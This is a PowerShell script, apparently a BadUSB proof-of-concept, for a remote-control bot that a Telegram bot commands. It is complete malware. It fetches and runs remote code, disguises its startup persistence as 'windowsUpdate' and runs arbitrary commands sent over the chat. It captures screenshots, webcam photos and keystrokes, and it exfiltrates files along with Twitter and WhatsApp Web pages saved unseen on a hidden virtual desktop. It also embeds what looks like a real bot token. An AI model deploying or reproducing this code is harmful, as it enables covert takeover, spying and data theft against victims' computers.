<#
BADUSB COMMANDS:
    # Execute 
    powershell.exe -windowstyle hidden -file this_file.ps1

    #Execute script from github
    iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1'))
    PowerShell.exe -WindowStyle Hidden -Command iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1'))
    PowerShell.exe -WindowStyle Minimized -Command iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1'))

REGEDIT:
	reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v windowsUpdate /t REG_SZ /d "powershell.exe -windowstyle hidden -file C:\Users\$env:username\Documents\windowsUpdate.ps1"	
https://www.akadia.com/services/windows_registry.html 

BOT TELEGRAM:
    https://stackoverflow.com/questions/34457568/how-to-show-options-in-telegram-bot
	#>


############
## CONFIG ##
############

$BotToken = "684213907:AAGtz9vSH7bifIZ7SsWH82JEhYO95FCNBdY"
$ChatID = '-255522090'
$githubScript = 'https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1'


###############
## FUNCTIONS ##
###############

function turnOffScreen {
    # Source: http://www.powershellmagazine.com/2013/07/18/pstip-how-to-switch-off-display-with-powershell/

    # Turn display off by calling WindowsAPI.
 
    # SendMessage(HWND_BROADCAST,WM_SYSCOMMAND, SC_MONITORPOWER, POWER_OFF)
    # HWND_BROADCAST  0xffff
    # WM_SYSCOMMAND   0x0112
    # SC_MONITORPOWER 0xf170
    # POWER_OFF       0x0002
 
    Add-Type -TypeDefinition '
    using System;
    using System.Runtime.InteropServices;
 
    namespace Utilities {
       public static class Display
       {
          [DllImport("user32.dll", CharSet = CharSet.Auto)]
          private static extern IntPtr SendMessage(
             IntPtr hWnd,
             UInt32 Msg,
             IntPtr wParam,
             IntPtr lParam
          );
 
          public static void PowerOff ()
          {
             SendMessage(
                (IntPtr)0xffff, // HWND_BROADCAST
                0x0112,         // WM_SYSCOMMAND
                (IntPtr)0xf170, // SC_MONITORPOWER
                (IntPtr)0x0002  // POWER_OFF
             );
          }
       }
    }
    '

    [Utilities.Display]::PowerOff()
}

function backdoor {
        reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v windowsUpdate /f
        
        Write-Host "Downloading backdoor.."
        Invoke-WebRequest -Uri $githubScript -OutFile C:\Users\$env:username\Documents\windowsUpdate.ps1

        Write-Host "Adding backdoor to the reg.."
		reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v windowsUpdate /t REG_SZ /d "powershell.exe -windowstyle hidden -file C:\Users\$env:username\Documents\windowsUpdate.ps1"

        # Check backdoor
        #$checkBackdoor = Get-CimInstance Win32_StartupCommand | Select-String windowsUpdate
        $checkBackdoor = reg query HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run | Select-String windowsUpdate
        Invoke-RestMethod -Uri "https://api.telegram.org/bot$($BotToken)/sendMessage?chat_id=$($ChatID)&text=$($checkBackdoor)"
		
        # Backdoor on startup programs
        $command = cmd.exe /c "powershell.exe -windowstyle hidden -file C:\Users\$env:username\Documents\windowsUpdate.ps1"
        Invoke-Expression -Command:$command
}

function screenshot {
      [Reflection.Assembly]::LoadWithPartialName("System.Drawing")
        function screenshot([Drawing.Rectangle]$bounds, $path) {
           $bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height
           $graphics = [Drawing.Graphics]::FromImage($bmp)

           $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)

           $bmp.Save($path)

           $graphics.Dispose()
           $bmp.Dispose()
        }
        $bounds = [Drawing.Rectangle]::FromLTRB(0, 0, 1920, 1080)
        screenshot $bounds "C:\Users\$env:username\Documents\screenshot.jpg"
}

function cleanAll {
    # Remove screenshots
    rm C:\Users\$env:username\Documents\screenshot.jpg
    # Remove cUrl
    rm C:\Users\$env:username\AppData\Local\Temp\1
    # Remove backdoor
    rm C:\Users\$env:username\Documents\windowsUpdate.ps1
    reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v windowsUpdate /f
}

function installCurl {
    $curl = "C:\Users\" + $env:username + "\appdata\local\temp\1\curl.exe"
    if(![System.IO.File]::Exists($curl)){
        # file with path $path doesn't exist
        $ruta = "C:\Users\" + $env:username + "\appdata\local\temp\1"
        $curl_zip = $ruta + "\curl.zip"
        $curl = $ruta + "\" + "curl.exe"
        $curl_mod = $ruta + "\" + "curl_mod.exe"
        if ( (Test-Path $ruta) -eq $false) {mkdir $ruta} else {}
        if ( (Test-Path $curl_mod) -eq $false ) {$webclient = "system.net.webclient" ; $webclient = New-Object $webclient ; $webrequest = $webclient.DownloadFile("https://raw.githubusercontent.com/cybervaca/psbotelegram/master/Funciones/curl.zip","$curl_zip")
        [System.Reflection.Assembly]::LoadWithPartialName('System.IO.Compression.FileSystem') | Out-Null
        [System.IO.Compression.ZipFile]::ExtractToDirectory("$curl_zip","$ruta") | Out-Null
        }
        return $curl
    }
    # else curl exist
    return $curl    
}

function sendPhoto {
    Write-Host "Sending screenshot.."
    $uri = "https://api.telegram.org/bot" + $BotToken + "/sendPhoto"
    $photo = "C:\Users\$env:username\Documents\screenshot.jpg"
    $curl = installCurl
    $argumenlist = $uri + ' -F chat_id=' + "$ChatID" + ' -F photo=@' + $photo  + ' -k '
    Start-Process $curl -ArgumentList $argumenlist -WindowStyle Hidden
    
    Write-Host "Deleting screenshot.."
    Start-Sleep -Seconds 5
    Remove-Item $photo
    #& $curl -s -X POST "https://api.telegram.org/bot"$BotToken"/sendPhoto" -F chat_id=$ChatID -F photo="@$SnapFile"
}

function ipPublic {
    #$ipPublic = Invoke-RestMethod http://ipinfo.io/json | Select -exp ip
    $ipPublic = Invoke-RestMethod http://ipinfo.io/json | Select-Object -Property city, region, postal, ip
    Invoke-RestMethod -Uri "https://api.telegram.org/bot$($BotToken)/sendMessage?chat_id=$($ChatID)&text=$($ipPublic)&parse_mode=html"
}

function download($FileToDownload) {
    $uri = "https://api.telegram.org/bot" + $BotToken + "/sendDocument"
    $curl = installCurl
    $argumenlist = $uri + ' -F chat_id=' + "$ChatID" + ' -F document=@' + $FileToDownload  + ' -k '
    Start-Process $curl -ArgumentList $argumenlist -WindowStyle Hidden

    #curl -F chat_id="$ChatID" -F document=@"$FileToDownload" https://api.telegram.org/bot<token>/sendDocument
}

function keylogger($time) {
    Write-Host "Downloading keylogger.."
    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-Keystrokes.ps1')
    $log = "C:\Users\$env:username\Documents\key.txt"
    Start-Sleep -Seconds 2

    Write-Host "Launching keylogger $time.."
    Get-Keystrokes -LogPath $log -Timeout $time
    
    Write-Host "Sending keystrokes.."
    Start-Sleep -Seconds $time
    download $log

    Write-Host "Deleting log.."
    Start-Sleep -Seconds 5
    Remove-Item $log
}

function webcam {
    Write-Host "Downloading CommandCam.."
    # https://batchloaf.wordpress.com/commandcam/
    $url = "https://github.com/tedburke/CommandCam/raw/master/CommandCam.exe"
    $outpath = "C:\Users\$env:username\Documents\CommandCam.exe"
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    Invoke-WebRequest -Uri $url -OutFile $outpath

    Write-Host "Taking picture.."
    $args = "/filename C:\Users\$env:username\Documents\image.jpg"
    Start-Process $outpath -ArgumentList $args -WindowStyle Hidden
    Start-Sleep -Seconds 5

    Write-Host "Sending picture.."
    $uri = "https://api.telegram.org/bot" + $BotToken + "/sendPhoto"
    $photo = "C:\Users\$env:username\Documents\image.jpg"
    $curl = installCurl
    $argumenlist = $uri + ' -F chat_id=' + "$ChatID" + ' -F photo=@' + $photo  + ' -k '
    Start-Process $curl -ArgumentList $argumenlist -WindowStyle Hidden
    
    Write-Host "Deleting picture.."
    Start-Sleep -Seconds 5
    Remove-Item $photo
    Remove-Item $outpath
}

function mainBrowser {
    Write-Host "Checking main browser on the reg.."
    $mainBrowser = reg query HKEY_CURRENT_USER\Software\Microsoft\Windows\Shell\Associations\UrlAssociations\http\UserChoice
    if ($mainBrowser -match 'chrome') {
        Write-Host "Chrome!"
        $chrome = "${env:ProgramFiles(x86)}\Google\Chrome\Application\chrome.exe"
        return $chrome
     }
    ElseIf ($mainBrowser -match 'Firefox') {
        Write-Host "Firefox!"
        $firefox = "${env:ProgramFiles(x86)}\Mozilla Firefox\firefox.exe"
        return $firefox
     }
}

<#
function forceHackTwitter {
    $mainBrowser = mainBrowser
    Start-Process $mainBrowser -ArgumentList "https://twitter.com/login" -WindowStyle Hidden

    Start-Sleep -Seconds 2
    $wshell = New-Object -ComObject wscript.shell; $wshell.AppActivate('Iniciar sesión en Twitter') 

    Start-sleep -Seconds 10
    $wshell.SendKeys("^{s}") 

    $wshell.AppActivate('Guardar como')
    Sleep -Seconds 2 
    $wshell.SendKeys('~') 
}
#>

function HackTwitterW10 {
    <#
    Creará un nuevo dekstop virtual e iniciará ahí el firefox y guardará el html, como es un desktop virtual el usuario no se enterará de lo que pasa
    Esta funcion solo es válida para W10.
    Manuales: 
        https://docs.microsoft.com/en-us/windows/desktop/inputdev/virtual-key-codes 
    #>


    # Inicia un virtual desktop.
    $KeyShortcut = Add-Type -MemberDefinition @"
[DllImport("user32.dll")]
static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);
//WIN + CTRL + D: Create a new desktop
public static void CreateVirtualDesktopInWin10()
{
    //Key down
    keybd_event((byte)0x5B, 0, 0, UIntPtr.Zero); //Left Windows key 
    keybd_event((byte)0x11, 0, 0, UIntPtr.Zero); //CTRL
    keybd_event((byte)0x44, 0, 0, UIntPtr.Zero); //D
    //Key up
    
    keybd_event((byte)0x5B, 0, (uint)0x2, UIntPtr.Zero);
    keybd_event((byte)0x11, 0, (uint)0x2, UIntPtr.Zero);
    keybd_event((byte)0x44, 0, (uint)0x2, UIntPtr.Zero);
}

"@ -Name CreateVirtualDesktop2 -UsingNamespace System.Threading -PassThru
   
    # Cambia al virtual desktop de la iquierda.
    $KeyShortcut2 = Add-Type -MemberDefinition @"
[DllImport("user32.dll")]
static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);
//WIN + CTRL + LEFT: Switch desktop
public static void SwitchLeftVirtualDesktopInWin10()
{
    //Key down
    keybd_event((byte)0x5B, 0, 0, UIntPtr.Zero); //Left Windows key 
    keybd_event((byte)0x11, 0, 0, UIntPtr.Zero); //CTRL
    keybd_event((byte)0x25, 0, 0, UIntPtr.Zero); //LEFT
    //Key up
    
    keybd_event((byte)0x5B, 0, (uint)0x2, UIntPtr.Zero);
    keybd_event((byte)0x11, 0, (uint)0x2, UIntPtr.Zero);
    keybd_event((byte)0x25, 0, (uint)0x2, UIntPtr.Zero);
}
"@ -Name SwitchLeftVirtualDesktop -UsingNamespace System.Threading -PassThru    

    # Cambia al virtual desktop de la derecha.
    $KeyShortcut3 = Add-Type -MemberDefinition @"
[DllImport("user32.dll")]
static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);
//WIN + CTRL + LEFT: Switch desktop
public static void SwitchRightVirtualDesktopInWin10()
{
    //Key down
    keybd_event((byte)0x5B, 0, 0, UIntPtr.Zero); //Left Windows key 
    keybd_event((byte)0x11, 0, 0, UIntPtr.Zero); //CTRL
    keybd_event((byte)0x27, 0, 0, UIntPtr.Zero); //RIGHT
    //Key up
    
    keybd_event((byte)0x5B, 0, (uint)0x2, UIntPtr.Zero);
    keybd_event((byte)0x11, 0, (uint)0x2, UIntPtr.Zero);
    keybd_event((byte)0x27, 0, (uint)0x2, UIntPtr.Zero);
}
"@ -Name SwitchRightVirtualDesktop -UsingNamespace System.Threading -PassThru    

    $KeyShortcut::CreateVirtualDesktopInWin10()
    
    # Inicia el navegador por defecto y abre twitter.
    $mainBrowser = mainBrowser 
    Start-Process $mainBrowser -ArgumentList '--new-window https://twitter.com/login' 
    Start-Sleep -Seconds 2
    $wshell = New-Object -ComObject wscript.shell
    $KeyShortcut2::SwitchLeftVirtualDesktopInWin10()

    # Espera 10 segundos a cargar completamente la página
    Start-sleep -Seconds 10

    # Activa la ventana con el nombre: 'Iniciar sesión en Twitter'
    $KeyShortcut3::SwitchRightVirtualDesktopInWin10()
    $wshell.AppActivate('Iniciar sesión en Twitter') 
    $wshell.SendKeys("^{s}") 
    $wshell.AppActivate('Guardar como')
    Sleep -Seconds 2 
    $wshell.SendKeys('t') 
    Sleep -Seconds 1 
    $wshell.SendKeys('~') 
    $KeyShortcut2::SwitchLeftVirtualDesktopInWin10()

    Sleep -Seconds 5
    Add-Type -assembly "system.io.compression.filesystem"
    [io.compression.zipfile]::CreateFromDirectory("C:\Users\$env:username\Downloads\w_files", "C:\Users\$env:username\Downloads\t_files.zip") 

    Sleep -Seconds 5
    download "C:\Users\$env:username\Downloads\t.html"
    download "C:\Users\$env:username\Downloads\t_files.zip"

}

function hackWhatsAPPW10 {
   <#
    No descarga las conversaciones de cada usuario, para ello habria que entrar en cada conversacion para que el JS carge de la BD de whatsapp los mensajes.
    Manuales: 
        https://docs.microsoft.com/en-us/windows/desktop/inputdev/virtual-key-codes 
    #>


    # Inicia un virtual desktop.
    $KeyShortcut = Add-Type -MemberDefinition @"
[DllImport("user32.dll")]
static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);
//WIN + CTRL + D: Create a new desktop
public static void CreateVirtualDesktopInWin10()
{
    //Key down
    keybd_event((byte)0x5B, 0, 0, UIntPtr.Zero); //Left Windows key 
    keybd_event((byte)0x11, 0, 0, UIntPtr.Zero); //CTRL
    keybd_event((byte)0x44, 0, 0, UIntPtr.Zero); //D
    //Key up
    
    keybd_event((byte)0x5B, 0, (uint)0x2, UIntPtr.Zero);
    keybd_event((byte)0x11, 0, (uint)0x2, UIntPtr.Zero);
    keybd_event((byte)0x44, 0, (uint)0x2, UIntPtr.Zero);
}

"@ -Name CreateVirtualDesktop2 -UsingNamespace System.Threading -PassThru
   
    # Cambia al virtual desktop de la iquierda.
    $KeyShortcut2 = Add-Type -MemberDefinition @"
[DllImport("user32.dll")]
static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);
//WIN + CTRL + LEFT: Switch desktop
public static void SwitchLeftVirtualDesktopInWin10()
{
    //Key down
    keybd_event((byte)0x5B, 0, 0, UIntPtr.Zero); //Left Windows key 
    keybd_event((byte)0x11, 0, 0, UIntPtr.Zero); //CTRL
    keybd_event((byte)0x25, 0, 0, UIntPtr.Zero); //LEFT
    //Key up
    
    keybd_event((byte)0x5B, 0, (uint)0x2, UIntPtr.Zero);
    keybd_event((byte)0x11, 0, (uint)0x2, UIntPtr.Zero);
    keybd_event((byte)0x25, 0, (uint)0x2, UIntPtr.Zero);
}
"@ -Name SwitchLeftVirtualDesktop -UsingNamespace System.Threading -PassThru    

    # Cambia al virtual desktop de la derecha.
    $KeyShortcut3 = Add-Type -MemberDefinition @"
[DllImport("user32.dll")]
static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);
//WIN + CTRL + LEFT: Switch desktop
public static void SwitchRightVirtualDesktopInWin10()
{
    //Key down
    keybd_event((byte)0x5B, 0, 0, UIntPtr.Zero); //Left Windows key 
    keybd_event((byte)0x11, 0, 0, UIntPtr.Zero); //CTRL
    keybd_event((byte)0x27, 0, 0, UIntPtr.Zero); //RIGHT
    //Key up
    
    keybd_event((byte)0x5B, 0, (uint)0x2, UIntPtr.Zero);
    keybd_event((byte)0x11, 0, (uint)0x2, UIntPtr.Zero);
    keybd_event((byte)0x27, 0, (uint)0x2, UIntPtr.Zero);
}
"@ -Name SwitchRightVirtualDesktop -UsingNamespace System.Threading -PassThru    

    $KeyShortcut::CreateVirtualDesktopInWin10()
    
    # Inicia el navegador por defecto y abre twitter.
    $mainBrowser = mainBrowser 
    Start-Process $mainBrowser -ArgumentList '--new-window https://web.whatsapp.com/' 
    Start-Sleep -Seconds 2
    $wshell = New-Object -ComObject wscript.shell
    $KeyShortcut2::SwitchLeftVirtualDesktopInWin10()

    # Espera 10 segundos a cargar completamente la página
    Start-sleep -Seconds 10

    # Activa la ventana con el nombre: 'Iniciar sesión en Twitter'
    $KeyShortcut3::SwitchRightVirtualDesktopInWin10()
    $wshell.AppActivate('(2) WhatsApp') 
    $wshell.SendKeys("^{s}") 
    $wshell.AppActivate('Guardar como')
    Sleep -Seconds 2 
    $wshell.SendKeys('w') 
    Sleep -Seconds 1 
    $wshell.SendKeys('~') 
    $KeyShortcut2::SwitchLeftVirtualDesktopInWin10()

    Sleep -Seconds 5
    Add-Type -assembly "system.io.compression.filesystem"
    [io.compression.zipfile]::CreateFromDirectory("C:\Users\$env:username\Downloads\w_files", "C:\Users\$env:username\Downloads\w_files.zip") 

    Sleep -Seconds 5
    download "C:\Users\$env:username\Downloads\w.html"
    download "C:\Users\$env:username\Downloads\w_files.zip"
}


#####################
## BYPASS POLICIES ##
#####################

Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted


##########################
## CONNECT WITH CHANNEL ##
##########################

$whoami = Invoke-Expression whoami
$ipV4 = Test-Connection -ComputerName (hostname) -Count 1  | Select -ExpandProperty IPV4Address
$ipV4 = $ipV4.IPAddressToString
$hostname = Invoke-Expression hostname
$pwd = pwd

$info = '[!] ' + $hostname + ' - ' + $whoami + ' - ' + $ipv4 + ' ' + $pwd + '> '
if($nopreview) { $preview_mode = "True" }
if($markdown) { $markdown_mode = "Markdown" } else {$markdown_mode = ""}

$payload = @{
    "chat_id" = $ChatID;
    "text" = $info;
    "parse_mode" = $markdown_mode;
    "disable_web_page_preview" = $preview_mode;
}
Invoke-WebRequest `
    -Uri ("https://api.telegram.org/bot{0}/sendMessage" -f $BotToken) `
    -Method Post `
    -ContentType "application/json;charset=utf-8" `
    -Body (ConvertTo-Json -Compress -InputObject $payload)


######################
## WAIT FOR COMMAND ##
######################

#Time to sleep for each loop before checking if a message with the magic word was received
$LoopSleep = 3
 
 
#Get the Last Message Time at the beginning of the script:When the script is ran the first time, it will ignore any last message received!
$BotUpdates = Invoke-WebRequest -Uri "https://api.telegram.org/bot$($BotToken)/getUpdates"
$BotUpdatesResults = [array]($BotUpdates | ConvertFrom-Json).result
$LastMessageTime_Origin = $BotUpdatesResults[$BotUpdatesResults.Count-1].message.date
 
#Read the responses in a while cycle
$DoNotExit = 1
#$PreviousLoop_LastMessageTime is going to be updated at every cycle (if the last message date changes)
$PreviousLoop_LastMessageTime = $LastMessageTime_Origin
 
$SleepStartTime = [Float] (get-date -UFormat %s) #This will be used to check if the $SleepTime has passed yet before sending a new notification out
While ($DoNotExit)  {
  Sleep -Seconds $LoopSleep
  #Reset variables that might be dirty from the previous cycle
  $LastMessageText = ""
  $CommandToRun = ""
  $CommandToRun_Result = ""
  $CommandToRun_SimplifiedOutput = ""
  $Message = ""
  
  #Get the current Bot Updates and store them in an array format to make it easier
  $BotUpdates = Invoke-WebRequest -Uri "https://api.telegram.org/bot$($BotToken)/getUpdates"
  $BotUpdatesResults = [array]($BotUpdates | ConvertFrom-Json).result
  
  #Get just the last message:
  $LastMessage = $BotUpdatesResults[$BotUpdatesResults.Count-1]
  #Get the last message time
  $LastMessageTime = $LastMessage.message.date
  
  #If the $LastMessageTime is newer than $PreviousLoop_LastMessageTime, then the user has typed something!
  If ($LastMessageTime -gt $PreviousLoop_LastMessageTime)  {
    #Looks like there's a new message!
    
	#Update $PreviousLoop_LastMessageTime with the time from the latest message
	$PreviousLoop_LastMessageTime = $LastMessageTime
	#Update the LastMessageTime
	$LastMessageTime = $LastMessage.Message.Date
	#Update the $LastMessageText
	$LastMessageText = $LastMessage.Message.Text
	
	Switch -Wildcard ($LastMessageText)  {
	  "/select $ipV4 *"  { #Important: run with a space
	    #The user wants to run a command
		$CommandToRun = ($LastMessageText -split ("/select $ipV4 "))[1] #This will remove "run "
		#$Message = "Ok $($LastMessage.Message.from.first_name), I will try to run the following command on $ipV4 : `n<b>$($CommandToRun)</b>"
		#$SendMessage = Invoke-RestMethod -Uri "https://api.telegram.org/bot$($BotToken)/sendMessage?chat_id=$($ChatID)&text=$($Message)&parse_mode=html"
		
		#Run the command
		Try {
		  Invoke-Expression $CommandToRun | Out-String | %  {
		    $CommandToRun_Result += "`n $($_)"
		  }
		}
		Catch  {
		  $CommandToRun_Result = $_.Exception.Message
		}
		
		$Message = "$($LastMessage.Message.from.first_name), I've ran <b>$($CommandToRun)</b> and this is the output:`n$CommandToRun_Result"
		$SendMessage = Invoke-RestMethod -Uri "https://api.telegram.org/bot$($BotToken)/sendMessage?chat_id=$($ChatID)&text=$($Message)&parse_mode=html"
        $pwd = pwd
        $info = '[!] ' + $hostname + ' - ' + $whoami + ' - ' + $ipv4 + ' ' + $pwd + '> '
		Invoke-RestMethod -Uri "https://api.telegram.org/bot$($BotToken)/sendMessage?chat_id=$($ChatID)&text=$($info)"
	  }
	  "/stop $ipV4"  {
		#The user wants to stop the script
		write-host "The script will end in 5 seconds"
		$ExitMessage = "$($LastMessage.Message.from.first_name) has requested the script to be terminated. It will need to be started again in order to accept new messages!"
		$ExitRestResponse = Invoke-RestMethod -Uri "https://api.telegram.org/bot$($BotToken)/sendMessage?chat_id=$($ChatID)&text=$($ExitMessage)&parse_mode=html"
		Sleep -seconds 5
		$DoNotExit = 0
	  }
      "/list"  {
        Invoke-WebRequest `
        -Uri ("https://api.telegram.org/bot{0}/sendMessage" -f $BotToken) `
        -Method Post `
        -ContentType "application/json;charset=utf-8" `
        -Body (ConvertTo-Json -Compress -InputObject $payload)
      }
      "/screenshot $ipV4"{
        screenshot
        sendPhoto
      }
      "/backdoor $ipV4"  {
        backdoor
      }
      "/meterpreter $ipV4"  {
         
      }
      "/cleanAll $ipV4" {
        cleanAll
      }
      "/ipPublic $ipV4" {
        ipPublic
      }
      "/download $ipV4 *"{
        $FileToDownload = ($LastMessageText -split ("/download $ipV4 "))[1]
        download $FileToDownload
      }
      "/hackT $ipV4"{
        HackTwitterW10
      }
      "/webcam $ipV4"{
        webcam
      }
      "/hackW $ipV4"{
        hackWhatsAPPW10
      }
      "/keylogger $ipV4 *"{
        $time = ($LastMessageText -split ("/keylogger $ipV4 "))[1]
        Keylogger $time
      }
	  default  {
	    #The message sent is unknown
		$Message = "Sorry $($LastMessage.Message.from.first_name), but I don't understand ""$($LastMessageText)""!"
		$SendMessage = Invoke-RestMethod -Uri "https://api.telegram.org/bot$($BotToken)/sendMessage?chat_id=$($ChatID)&text=$($Message)&parse_mode=html"
	  }
	}
	
  }
}

